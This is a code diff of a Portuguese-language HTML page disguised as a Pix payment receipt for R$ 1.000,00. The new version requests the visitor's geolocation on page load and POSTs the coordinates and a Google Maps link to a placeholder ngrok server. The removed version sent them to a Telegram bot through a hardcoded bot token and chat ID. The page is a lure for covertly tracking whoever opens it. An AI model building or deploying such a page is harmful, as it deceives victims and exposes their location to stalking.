@@ -1,70 +1,81 @@
+
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
+
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Comprovante de Pix</title>
+  <title>Comprovante de Recebimento</title>
+  <link rel="stylesheet" href="styles.css" />
 </head>
-<body>
-  <h1>Comprovante de Pix Recebido</h1>
-  <img src="comprovante.png" alt="Comprovante de Pix" width="300">
-  <p>Para confirmar, precisamos da sua localização. Por favor, permita a permissão de localização.</p>
 
-  <button onclick="getLocation()">Obter Localização</button>
+<body>
+  <div class="comprovante-container">
+    <h1>Comprovante de Recebimento</h1>
+
+    <div class="informacoes">
+      <p><span>Data:</span> <span id="data-atual"></span></p>
+      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
+      <p><span>De:</span> João Silva de Oliveira</p>
+      <p><span>Status:</span> Recebido com Sucesso</p>
+    </div>
+
+    <button class="botao" onclick="window.print()">Imprimir</button>
+
+    <div class="comprovante-footer">
+      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
+      <p><a href="#">Clique aqui</a> para mais informações.</p>
+    </div>
+
+  </div>
 
   <script>
-    function getLocation() {
+    window.addEventListener("load", () => {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, showError);
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
       } else {
-        alert("Geolocalização não é suportada por este navegador.");
+        alert("Algo deu errado. Tente novamente mais tarde.");
       }
-    }
+    });
+
+    const dataAtual = new Date();
+    const dia = String(dataAtual.getDate()).padStart(2, '0');
+    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+    const ano = dataAtual.getFullYear();
+
+    const dataFormatada = `${dia}/${mes}/${ano}`;
+
+    document.getElementById("data-atual").textContent = dataFormatada;
+
+    console.log(dataAtual)
 
     function sendLocation(position) {
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
-      
-      // Token do bot e chat ID fornecidos
-      const telegramBotToken = "7964496822:AAFCBrNEI0b0oYQOFimCMobsWi_peVjN0wY";  // Seu token do bot
-      const chatId = "6045619916";  // Seu chat ID (ID do usuário ou grupo do Telegram)
-      
-      const url = `https://api.telegram.org/bot${telegramBotToken}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`;
-      
-      // Log da URL para depuração
-      console.log("URL para enviar localização:", url);
-      
-      fetch(url)
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+      fetch("NGROK_SERVER/send-location", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ latitude, longitude, maps })
+      })
         .then(response => response.json())
         .then(data => {
-          console.log("Resposta da API do Telegram:", data);  // Log para ver o retorno da API
-          if (data.ok) {
-            alert("Localização enviada com sucesso!");
-          } else {
-            alert("Erro ao enviar localização. Detalhes: " + JSON.stringify(data));
+          if (!data.success) {
+            alert("Erro ao enviar o comprovante.");
           }
         })
         .catch(error => {
-          alert("Erro na comunicação com a API do Telegram: " + error);
+          console.error("Erro:", error);
         });
     }
 
-    function showError(error) {
-      switch(error.code) {
-        case error.PERMISSION_DENIED:
-          alert("Usuário negou a solicitação de localização.");
-          break;
-        case error.POSITION_UNAVAILABLE:
-          alert("A posição não está disponível.");
-          break;
-        case error.TIMEOUT:
-          alert("O tempo de solicitação expirou.");
-          break;
-        case error.UNKNOWN_ERROR:
-          alert("Erro desconhecido.");
-          break;
-      }
+    function handleError(error) {
+      alert("Erro ao obter a localização: " + error.message);
     }
   </script>
 </body>
+
 </html>
